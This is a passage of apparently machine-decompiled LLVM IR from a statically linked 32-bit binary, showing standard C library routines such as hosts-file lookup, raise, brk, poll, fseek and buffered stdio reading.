  %v5_80563e9 = call i32 @__GI_strcoll(i8* %v4_80563e9, i32 ptrtoint ([7 x i8]* @global_var_805ab19.568 to i32), i32 %v0_80563e1, i32 %v0_80563e1)
  %v1_80563f1 = icmp eq i32 %v5_80563e9, 0
  br i1 %v1_80563f1, label %dec_label_pc_805641f.preheader, label %dec_label_pc_8056462.backedge

dec_label_pc_805641f.preheader:                   ; preds = %dec_label_pc_80563cd, %dec_label_pc_80563e1
  %v0_805641f92 = load i32, i32* @global_var_8061bd8.561, align 8
  %tmp4594 = icmp slt i32 %v0_805641f92, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
  br i1 %tmp4695, label %dec_label_pc_80563f7, label %dec_label_pc_8056428

dec_label_pc_80563f7:                             ; preds = %dec_label_pc_805641f.preheader, %dec_label_pc_80563f7.dec_label_pc_80563f7_crit_edge
  %v0_805641f96 = phi i32 [ %v0_805641f, %dec_label_pc_80563f7.dec_label_pc_80563f7_crit_edge ], [ %v0_805641f92, %dec_label_pc_805641f.preheader ]
  %v1_80563f7 = add i32 %v0_805641f96, -1
  store i32 %v1_80563f7, i32* @global_var_8061bd8.561, align 8
  %v1_8056400 = mul i32 %v1_80563f7, 4
  %v2_8056400 = add i32 %v1_8056400, 134618040
  %v3_8056400 = inttoptr i32 %v2_8056400 to i32*
  %v4_8056400 = load i32, i32* %v3_8056400, align 4
  %v1_8056407 = call i32 @free(i32 %v4_8056400)
  %v0_805640c = load i32, i32* @global_var_8061bd8.561, align 8
  %v1_8056414 = mul i32 %v0_805640c, 4
  %v2_8056414 = add i32 %v1_8056414, ptrtoint (i32* @global_var_8061bb8.569 to i32)
  %v3_8056414 = inttoptr i32 %v2_8056414 to i32*
  store i32 0, i32* %v3_8056414, align 4
  %v0_805641f = load i32, i32* @global_var_8061bd8.561, align 8
  %tmp45 = icmp slt i32 %v0_805641f, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_80563f7.dec_label_pc_80563f7_crit_edge, label %dec_label_pc_8056428

dec_label_pc_80563f7.dec_label_pc_80563f7_crit_edge: ; preds = %dec_label_pc_80563f7
  br label %dec_label_pc_80563f7

dec_label_pc_8056428:                             ; preds = %dec_label_pc_80563f7, %dec_label_pc_805641f.preheader
  %v0_805641f.lcssa = phi i32 [ %v0_805641f92, %dec_label_pc_805641f.preheader ], [ %v0_805641f, %dec_label_pc_80563f7 ]
  store i32 1, i32* @esi, align 4
  %v5_8056455100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8056455100, label %dec_label_pc_8056457, label %dec_label_pc_8056462.backedge

dec_label_pc_805642f:                             ; preds = %dec_label_pc_8056457
  %v2_8056432 = mul i32 %v1_8056432102, 4
  %v4_8056432 = add i32 %v2_8056432, %v3_805639d
  %v5_8056432 = inttoptr i32 %v4_8056432 to i32*
  %v6_8056432 = load i32, i32* %v5_8056432, align 4
  %v1_8056439 = inttoptr i32 %v6_8056432 to i8*
  %v2_8056439 = call i32 @__GI_strdup(i8* %v1_8056439)
  %v0_805643e = load i32, i32* @esi, align 4
  %v1_805643e = add i32 %v0_805643e, 1
  store i32 %v1_805643e, i32* @esi, align 4
  %v1_805643f = load i32, i32* @ebx, align 4
  %v2_805643f = mul i32 %v1_805643f, 4
  %v3_805643f = add i32 %v2_805643f, 134618040
  %v4_805643f = inttoptr i32 %v3_805643f to i32*
  store i32 %v2_8056439, i32* %v4_805643f, align 4
  %v0_8056446 = load i32, i32* @ebx, align 4
  %v1_8056446 = add i32 %v0_8056446, 1
  store i32 %v1_8056446, i32* @global_var_8061bd8.561, align 8
  %v0_8056451.pre = load i32, i32* @esi, align 4
  %v5_8056455 = icmp slt i32 %v0_8056451.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8056455, label %dec_label_pc_8056457, label %dec_label_pc_8056462.backedge

dec_label_pc_8056457:                             ; preds = %dec_label_pc_8056428, %dec_label_pc_805642f
  %v1_8056432102 = phi i32 [ %v0_8056451.pre, %dec_label_pc_805642f ], [ 1, %dec_label_pc_8056428 ]
  %v0_8056457101 = phi i32 [ %v1_8056446, %dec_label_pc_805642f ], [ %v0_805641f.lcssa, %dec_label_pc_8056428 ]
  store i32 %v0_8056457101, i32* @ebx, align 4
  %v7_8056460 = icmp sgt i32 %v0_8056457101, 3
  br i1 %v7_8056460, label %dec_label_pc_8056462.backedge, label %dec_label_pc_805642f

dec_label_pc_80562ef.preheader:                   ; preds = %dec_label_pc_80562ef.preheader.lr.ph, %dec_label_pc_8056462.backedge
  %v0_80562ef.pre = load i32, i32* @ebx, align 4
  %v4_80562ef.pre = load i32, i32* @ecx, align 4
  %v1_80562ef51 = inttoptr i32 %v0_80562ef.pre to i8*
  %v2_80562ef52 = load i8, i8* %v1_80562ef51, align 1
  %v3_80562ef53 = zext i8 %v2_80562ef52 to i32
  %v5_80562ef54 = and i32 %v4_80562ef.pre, -256
  %v6_80562ef55 = or i32 %v3_80562ef53, %v5_80562ef54
  store i32 %v6_80562ef55, i32* @ecx, align 4
  %v4_80562f156 = icmp eq i8 %v2_80562ef52, 0
  br i1 %v4_80562f156, label %dec_label_pc_8056462.backedge, label %dec_label_pc_80562f9.lr.ph

dec_label_pc_80562f9.lr.ph:                       ; preds = %dec_label_pc_80562ef.preheader
  %v0_80562fc.pre = load i32, i32* @global_var_805b278, align 8
  br label %dec_label_pc_80562f9

dec_label_pc_805647e:                             ; preds = %dec_label_pc_8056462.backedge, %dec_label_pc_8056462.preheader
  %v0_8056481 = load i32, i32* @ebp, align 4
  %v1_8056482 = inttoptr i32 %v0_8056481 to i16*
  %v2_8056482 = call i32 @__GI_fclose(i16* %v1_8056482)
  br label %dec_label_pc_8056497

dec_label_pc_805648c:                             ; preds = %dec_label_pc_80562cb
  %v0_805648c = call i32 @__GI___h_errno_location()
  %v1_8056491 = inttoptr i32 %v0_805648c to i32*
  store i32 3, i32* %v1_8056491, align 4
  br label %dec_label_pc_8056497

dec_label_pc_8056497:                             ; preds = %entry, %dec_label_pc_805647e, %dec_label_pc_805648c
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8056284, i32* @eax, align 4
  %v2_80564a3 = call i32 @__pthread_return_void(i32 %v2_8056284, i32 1)
  store i32 %v0_8056270, i32* @ebp, align 4
  ret i32 %v2_80564a3

; uselistorder directives
  uselistorder i32 %v0_80562fc.pre, { 1, 0 }
  uselistorder i32 %v6_80562ef55, { 1, 0 }
  uselistorder i8 %v2_80562ef52, { 1, 2, 0 }
  uselistorder i8* %v1_80562ef51, { 1, 0 }
  uselistorder i32 %v0_80562ef.pre, { 1, 0 }
  uselistorder i32 %v0_805641f, { 0, 2, 1 }
  uselistorder i32 %v1_80563f7, { 1, 0 }
  uselistorder i32 %v0_80563c2, { 1, 0 }
  uselistorder i32 %v0_80563bc.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8056355, { 1, 0 }
  uselistorder i8 %v2_805634f83, { 1, 0 }
  uselistorder i32 %v2_8056336, { 1, 0 }
  uselistorder i8 %v2_805633068, { 1, 0 }
  uselistorder i32 %v1_805632f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80562f9, { 1, 0 }
  uselistorder i32 %v1_80562ee, { 1, 0, 2 }
  uselistorder i32 %v2_8056469, { 2, 3, 0, 1 }
  uselistorder i32 %v2_80562d7, { 1, 0 }
  uselistorder i32 %v2_80562b9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 19, 16, 15, 14, 13, 12, 11, 10, 26, 25, 24, 23, 1, 9, 8, 7, 6, 5, 18, 17, 20, 22, 21, 3, 4, 2, 0 }
  uselistorder i32* @global_var_8061bd8.561, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 2, 1, 3, 4, 0 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 15, 9, 16, 10, 11, 12, 13, 17 }
  uselistorder i32 164, { 2, 1, 0 }
  uselistorder i32* @global_var_8061bd4.498, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805b4e8.497 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8056497, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80562ef.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056457, { 1, 0 }
  uselistorder label %dec_label_pc_80563f7, { 1, 0 }
  uselistorder label %dec_label_pc_805641f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80563cd, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80563c2, { 1, 0 }
  uselistorder label %dec_label_pc_8056378, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056371, { 1, 0 }
  uselistorder label %dec_label_pc_8056368, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056355, { 1, 0 }
  uselistorder label %dec_label_pc_8056336, { 1, 0 }
  uselistorder label %dec_label_pc_8056462.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_8056462.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_80564d7 = inttoptr i32 %arg3 to i32*
  %v10_80564d7 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_80564d7, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_80564d7
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80564e3 = call i32 @__libc_getpid()
  %v2_80564ef = call i32 @kill(i32 %v0_80564e3, i32 %arg1)
  ret i32 %v2_80564ef

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 1, 3, 2 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_80564f8 = load i32, i32* @eax, align 4
  %v1_80564f8 = add i32 %v0_80564f8, 28
  %v2_80564f8 = inttoptr i32 %v1_80564f8 to i32*
  %v3_80564f8 = load i32, i32* %v2_80564f8, align 4
  store i32 %v3_80564f8, i32* @global_var_8061bdc.570, align 4
  %v1_8056501 = add i32 %v0_80564f8, 44
  %v2_8056501 = inttoptr i32 %v1_8056501 to i32*
  %v3_8056501 = load i32, i32* %v2_8056501, align 4
  store i32 %v3_8056501, i32* @global_var_8061be0.571, align 32
  ret i32 %v3_8056501
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805650c = load i32, i32* @ebx, align 4
  store i32 %v0_805650c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805651f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805651f, i32* @global_var_80617a4.548, align 4
  %v7_805652a = icmp ult i32 %v1_805651f, %arg1
  %v1_805652c = icmp eq i1 %v7_805652a, false
  br i1 %v1_805652c, label %dec_label_pc_805653c, label %dec_label_pc_805652e

dec_label_pc_805652e:                             ; preds = %entry
  %v0_805652e = load i32, i32* %stack_var_-4, align 4
  %v1_805652e = call i32 @__errno_location(i32 %v0_805652e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8056536 = inttoptr i32 %v1_805652e to i32*
  store i32 12, i32* %v1_8056536, align 4
  %v0_805653c.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805653c

dec_label_pc_805653c:                             ; preds = %entry, %dec_label_pc_805652e
  %v0_805653c = phi i32 [ 0, %entry ], [ %v0_805653c.pre, %dec_label_pc_805652e ]
  %v2_8056540 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056540, i32* @ebx, align 4
  ret i32 %v0_805653c

; uselistorder directives
  uselistorder i32 %v1_805651f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_80617a4.548, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805653c, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8056544 = load i32, i32* @edi, align 4
  store i32 %v0_8056544, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8056554 = load i32, i32* @ebx, align 4
  %v1_8056555 = inttoptr i32 %tmp4 to %pollfd*
  %v5_805655c = call i32 @poll(%pollfd* %v1_8056555, i32 %tmp3, i32 %tmp)
  store i32 %v0_8056554, i32* @ebx, align 4
  store i32 %v5_805655c, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_805655c, -4095
  br i1 %tmp10, label %dec_label_pc_8056574, label %dec_label_pc_8056568

dec_label_pc_8056568:                             ; preds = %entry
  %v1_8056568 = call i32 @__errno_location(i32 %v0_8056554)
  %v0_805656d = load i32, i32* %edi.global-to-local, align 4
  %v1_805656d = sub i32 0, %v0_805656d
  %v2_805656f = inttoptr i32 %v1_8056568 to i32*
  store i32 %v1_805656d, i32* %v2_805656f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056574

dec_label_pc_8056574:                             ; preds = %entry, %dec_label_pc_8056568
  %v0_8056574 = phi i32 [ %v5_805655c, %entry ], [ -1, %dec_label_pc_8056568 ]
  %v2_8056578 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056578, i32* @edi, align 4
  ret i32 %v0_8056574

; uselistorder directives
  uselistorder i32 %v5_805655c, { 1, 0, 2 }
  uselistorder i32 %v0_8056554, { 1, 0 }
  uselistorder label %dec_label_pc_8056574, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8056587 = ashr i32 %arg2, 31
  %v4_805658e = inttoptr i32 %arg1 to i16*
  %v5_805658e = call i32 @__GI_fseeko64(i16* %v4_805658e, i32 %arg2, i32 %v1_8056587, i32 %arg3)
  ret i32 %v5_805658e
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8056598 = load i32, i32* @ebp, align 4
  %v0_8056599 = load i32, i32* @edi, align 4
  %v0_805659a = load i32, i32* @esi, align 4
  %v0_805659b = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_80565ab = ptrtoint i16* %arg1 to i32
  store i32 %v4_80565ab, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_80565cf, label %dec_label_pc_80565bc

dec_label_pc_80565bc:                             ; preds = %entry
  %v1_80565bc = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_80565bc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_80565c4 = inttoptr i32 %v1_80565bc to i32*
  store i32 22, i32* %v1_80565c4, align 4
  br label %dec_label_pc_8056671

dec_label_pc_80565cf:                             ; preds = %entry
  %v1_80565cf = add i32 %v4_80565ab, 52
  %v2_80565cf = inttoptr i32 %v1_80565cf to i32*
  %v3_80565cf = load i32, i32* %v2_80565cf, align 4
  %v1_80565d2 = icmp eq i32 %v3_80565cf, 0
  %v1_80565d4 = icmp eq i1 %v1_80565d2, false
  br i1 %v1_80565d4, label %dec_label_pc_80565f5, label %dec_label_pc_80565d6

dec_label_pc_80565d6:                             ; preds = %dec_label_pc_80565cf
  %v1_80565d6 = add i32 %v4_80565ab, 56
  store i32 %v1_80565d6, i32* @ebx, align 4
  %v2_80565e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80565e0, i32* @eax, align 4
  %v3_80565e5 = call i32 @__pthread_return_void(i32 %v2_80565e0, i32 134563799)
  store i32 %v3_80565e5, i32* %eax.global-to-local, align 4
  %v0_80565ea = load i32, i32* @ebx, align 4
  %v2_80565ed = call i32 @__pthread_return_0(i32 %v0_80565ea)
  store i32 %v2_80565ed, i32* %eax.global-to-local, align 4
  %v0_80565f5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80565f5

dec_label_pc_80565f5:                             ; preds = %dec_label_pc_80565cf, %dec_label_pc_80565d6
  %v0_80565fd = phi i32 [ %v4_80565ab, %dec_label_pc_80565cf ], [ %v0_80565f5.pre, %dec_label_pc_80565d6 ]
  %v1_80565f5 = inttoptr i32 %v0_80565fd to i8*
  %v2_80565f5 = load i8, i8* %v1_80565f5, align 1
  %v3_80565f5 = and i8 %v2_80565f5, 64
  %v4_80565f5 = icmp eq i8 %v3_80565f5, 0
  br i1 %v4_80565f5, label %dec_label_pc_805660a, label %dec_label_pc_80565fa

dec_label_pc_80565fa:                             ; preds = %dec_label_pc_80565f5
  %v2_80565fe = call i32 @__stdio_wcommit(i32 %v0_80565fd)
  store i32 %v2_80565fe, i32* %eax.global-to-local, align 4
  %v1_8056606 = icmp eq i32 %v2_80565fe, 0
  %v1_8056608 = icmp eq i1 %v1_8056606, false
  br i1 %v1_8056608, label %dec_label_pc_8056659, label %dec_label_pc_805660a

dec_label_pc_805660a:                             ; preds = %dec_label_pc_80565fa, %dec_label_pc_80565f5
  %v0_805660a = load i32, i32* @edi, align 4
  %v9_805660a = icmp eq i32 %v0_805660a, 1
  %v1_805660d = icmp eq i1 %v9_805660a, false
  br i1 %v1_805660d, label %dec_label_pc_805660a.dec_label_pc_8056623_crit_edge, label %dec_label_pc_805660f

dec_label_pc_805660a.dec_label_pc_8056623_crit_edge: ; preds = %dec_label_pc_805660a
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8056623

dec_label_pc_805660f:                             ; preds = %dec_label_pc_805660a
  %v0_805660f = load i32, i32* @ecx, align 4
  %v2_8056611 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8056611, i32* %eax.global-to-local, align 4
  %v0_8056616 = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_8056616 to i32*
  %v6_8056617 = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_8056611, i32 %v0_805660f, i32 %v0_805660f)
  store i32 %v6_8056617, i32* %eax.global-to-local, align 4
  %v2_805661f = icmp slt i32 %v6_8056617, 0
  br i1 %v2_805661f, label %dec_label_pc_8056659, label %dec_label_pc_805660f.dec_label_pc_8056623_crit_edge

dec_label_pc_805660f.dec_label_pc_8056623_crit_edge: ; preds = %dec_label_pc_805660f
  %v0_8056624.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056623

dec_label_pc_8056623:                             ; preds = %dec_label_pc_805660a.dec_label_pc_8056623_crit_edge, %dec_label_pc_805660f.dec_label_pc_8056623_crit_edge
  %v2_8056625.pre-phi = phi i32 [ %.pre6, %dec_label_pc_805660a.dec_label_pc_8056623_crit_edge ], [ %v2_8056611, %dec_label_pc_805660f.dec_label_pc_8056623_crit_edge ]
  %v0_8056624 = phi i32 [ %v0_805660a, %dec_label_pc_805660a.dec_label_pc_8056623_crit_edge ], [ %v0_8056624.pre, %dec_label_pc_805660f.dec_label_pc_8056623_crit_edge ]
  %v0_8056623 = load i32, i32* @edx, align 4
  store i32 %v2_8056625.pre-phi, i32* %eax.global-to-local, align 4
  %v0_805662a = load i32, i32* @esi, align 4
  %v5_805662b = inttoptr i32 %v2_8056625.pre-phi to i32*
  %v6_805662b = call i32 @__stdio_seek(i32 %v0_805662a, i32* %v5_805662b, i32 %v0_8056624, i32 %v0_8056623)
  store i32 %v6_805662b, i32* %eax.global-to-local, align 4
  %v2_8056633 = icmp slt i32 %v6_805662b, 0
  br i1 %v2_8056633, label %dec_label_pc_8056659, label %dec_label_pc_8056637

dec_label_pc_8056637:                             ; preds = %dec_label_pc_8056623
  %v0_8056637 = load i32, i32* @esi, align 4
  %v1_8056637 = inttoptr i32 %v0_8056637 to i16*
  %v2_8056637 = load i16, i16* %v1_8056637, align 2
  %v3_8056637 = and i16 %v2_8056637, -72
  store i16 %v3_8056637, i16* %v1_8056637, align 2
  %v0_805663b = load i32, i32* @esi, align 4
  %v1_805663b = add i32 %v0_805663b, 8
  %v2_805663b = inttoptr i32 %v1_805663b to i32*
  %v3_805663b = load i32, i32* %v2_805663b, align 4
  store i32 %v3_805663b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_8056640 = add i32 %v0_805663b, 16
  %v3_8056640 = inttoptr i32 %v2_8056640 to i32*
  store i32 %v3_805663b, i32* %v3_8056640, align 4
  %v0_8056643 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056643 = load i32, i32* @esi, align 4
  %v2_8056643 = add i32 %v1_8056643, 20
  %v3_8056643 = inttoptr i32 %v2_8056643 to i32*
  store i32 %v0_8056643, i32* %v3_8056643, align 4
  %v0_8056646 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056646 = load i32, i32* @esi, align 4
  %v2_8056646 = add i32 %v1_8056646, 24
  %v3_8056646 = inttoptr i32 %v2_8056646 to i32*
  store i32 %v0_8056646, i32* %v3_8056646, align 4
  %v0_8056649 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056649 = load i32, i32* @esi, align 4
  %v2_8056649 = add i32 %v1_8056649, 28
  %v3_8056649 = inttoptr i32 %v2_8056649 to i32*
  store i32 %v0_8056649, i32* %v3_8056649, align 4
  %v0_805664c = load i32, i32* @esi, align 4
  %v1_805664c = add i32 %v0_805664c, 44
  %v2_805664c = inttoptr i32 %v1_805664c to i32*
  store i32 0, i32* %v2_805664c, align 4
  %v0_8056653 = load i32, i32* @esi, align 4
  %v1_8056653 = add i32 %v0_8056653, 2
  %v2_8056653 = inttoptr i32 %v1_8056653 to i8*
  store i8 0, i8* %v2_8056653, align 1
  br label %dec_label_pc_805665c

dec_label_pc_8056659:                             ; preds = %dec_label_pc_8056623, %dec_label_pc_805660f, %dec_label_pc_80565fa
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805665c

dec_label_pc_805665c:                             ; preds = %dec_label_pc_8056637, %dec_label_pc_8056659
  br i1 %v1_80565d4, label %dec_label_pc_8056671, label %dec_label_pc_8056660

dec_label_pc_8056660:                             ; preds = %dec_label_pc_805665c
  %v2_8056664 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8056664, i32* @eax, align 4
  %v3_8056669 = call i32 @__pthread_return_void(i32 %v2_8056664, i32 1)
  store i32 %v3_8056669, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056671

dec_label_pc_8056671:                             ; preds = %dec_label_pc_805665c, %dec_label_pc_80565bc, %dec_label_pc_8056660
  %v0_8056674 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056674, i32* %eax.global-to-local, align 4
  store i32 %v0_805659b, i32* @ebx, align 4
  store i32 %v0_805659a, i32* @esi, align 4
  store i32 %v0_8056599, i32* @edi, align 4
  store i32 %v0_8056598, i32* @ebp, align 4
  ret i32 %v0_8056674

; uselistorder directives
  uselistorder i32 %v2_8056625.pre-phi, { 1, 0 }
  uselistorder i32 %v0_805660a, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 15, 14, 13, 12, 11, 10, 9, 3, 27, 33, 32, 7, 2, 1, 0, 6, 31, 5, 8, 21, 20, 19, 23, 22, 30, 18, 29, 4, 17, 16, 26, 25, 24 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 49, 48, 45, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 0, 47, 46, 59, 58, 57, 56, 7, 6, 5, 4, 55, 54, 3, 2, 9, 8, 34, 33, 32, 31, 30, 29, 38, 37, 36, 35, 53, 52, 28, 27, 51, 50, 26, 25, 24, 23, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 134563799, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 14, 15, 16, 17, 18, 23, 24, 25, 26, 19 }
  uselistorder i32 52, { 8, 2, 13, 1, 3, 4, 5, 14, 15, 6, 11, 7, 9, 16, 12, 10, 0 }
  uselistorder i32 22, { 8, 15, 3, 4, 5, 6, 11, 14, 13, 9, 10, 12, 16, 7, 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056671, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805665c, { 1, 0 }
  uselistorder label %dec_label_pc_8056623, { 1, 0 }
  uselistorder label %dec_label_pc_80565f5, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805667c = load i32, i32* @ebx, align 4
  store i32 %v0_805667c, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8056682 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056682, i32* @ebx, align 4
  %v1_805668a = bitcast i16* %arg1 to i8*
  %v2_805668a = load i8, i8* %v1_805668a, align 1
  %v3_805668a = and i8 %v2_805668a, 4
  %v4_805668a = icmp eq i8 %v3_805668a, 0
  %v1_805668d = icmp eq i1 %v4_805668a, false
  br i1 %v1_805668d, label %dec_label_pc_80566bc, label %dec_label_pc_805668f

dec_label_pc_805668f:                             ; preds = %entry
  %v2_805668f = icmp slt i32 %arg3, 0
  %v1_8056691 = icmp eq i1 %v2_805668f, false
  br i1 %v1_8056691, label %dec_label_pc_8056698, label %dec_label_pc_8056693

dec_label_pc_8056693:                             ; preds = %dec_label_pc_805668f
  br label %dec_label_pc_8056698

dec_label_pc_8056698:                             ; preds = %dec_label_pc_805668f, %dec_label_pc_8056693
  %v0_8056699 = phi i32 [ %arg3, %dec_label_pc_805668f ], [ 2147483647, %dec_label_pc_8056693 ]
  %v1_805669e = add i32 %v4_8056682, 4
  %v2_805669e = inttoptr i32 %v1_805669e to i32*
  %v3_805669e = load i32, i32* %v2_805669e, align 4
  %v3_80566a1 = inttoptr i32 %arg2 to i32*
  %v4_80566a1 = call i32 @__libc_read(i32 %v3_805669e, i32* %v3_80566a1, i32 %v0_8056699)
  store i32 %v4_80566a1, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v4_80566a1, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_80566bc, label %dec_label_pc_80566ae

dec_label_pc_80566ae:                             ; preds = %dec_label_pc_8056698
  %v1_80566a9 = icmp eq i32 %v4_80566a1, 0
  %v4_80566ac = icmp eq i1 %v1_80566a9, false
  %v0_80566b6 = load i32, i32* @ebx, align 4
  %v1_80566b6 = inttoptr i32 %v0_80566b6 to i16*
  %v2_80566b6 = load i16, i16* %v1_80566b6, align 2
  br i1 %v4_80566ac, label %dec_label_pc_80566b6, label %dec_label_pc_80566b0

dec_label_pc_80566b0:                             ; preds = %dec_label_pc_80566ae
  %v3_80566b0 = or i16 %v2_80566b6, 4
  store i16 %v3_80566b0, i16* %v1_80566b6, align 2
  %v0_80566bf.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566bc

dec_label_pc_80566b6:                             ; preds = %dec_label_pc_80566ae
  %v3_80566b6 = or i16 %v2_80566b6, 8
  store i16 %v3_80566b6, i16* %v1_80566b6, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566bc

dec_label_pc_80566bc:                             ; preds = %dec_label_pc_8056698, %entry, %dec_label_pc_80566b0, %dec_label_pc_80566b6
  %v0_80566bf = phi i32 [ %v4_80566a1, %dec_label_pc_8056698 ], [ 0, %entry ], [ %v0_80566bf.pre, %dec_label_pc_80566b0 ], [ 0, %dec_label_pc_80566b6 ]
  %v2_80566be = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80566be, i32* @ebx, align 4
  ret i32 %v0_80566bf

; uselistorder directives
  uselistorder i16 %v2_80566b6, { 1, 0 }
  uselistorder i32 %v4_80566a1, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_read, { 1, 0, 2 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80566bc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8056698, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
